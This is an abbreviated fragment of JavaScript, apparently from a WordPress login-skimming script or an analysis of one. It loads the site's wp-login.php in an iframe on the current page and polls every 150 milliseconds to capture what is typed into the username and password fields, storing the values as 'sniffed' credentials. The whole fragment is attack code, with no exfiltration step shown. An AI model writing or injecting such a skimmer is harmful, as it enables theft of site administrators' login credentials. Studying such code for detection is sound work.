...
const wpLoginURL = wpRoot + '/wp-login.php';
const iframeID = 'ifr';
const cmsID = '_wp_';
let sniffedUsername = '';
let sniffedPassword = '';
...
function monitorWpUserInput(iframeID, endpointTitle) {
  ...
  for (i = 0; i < inputTags.length; i ++) {
    if ((inputTags[i].id == 'user_login') && (sniffedUsername != inputTags[i].value)) {
      sniffedUsername = inputTags[i].value;
    }
    if ((inputTags[i].id == 'user_pass') && (sniffedPassword != inputTags[i].value)) {
...
loginTitle = getEndpointTitle(wpLoginURL);
addIframeToCurrPage(iframeID, wpLoginURL, loginTitle);
setInterval(function() { monitorWpUserInput(iframeID, loginTitle); }, 150);
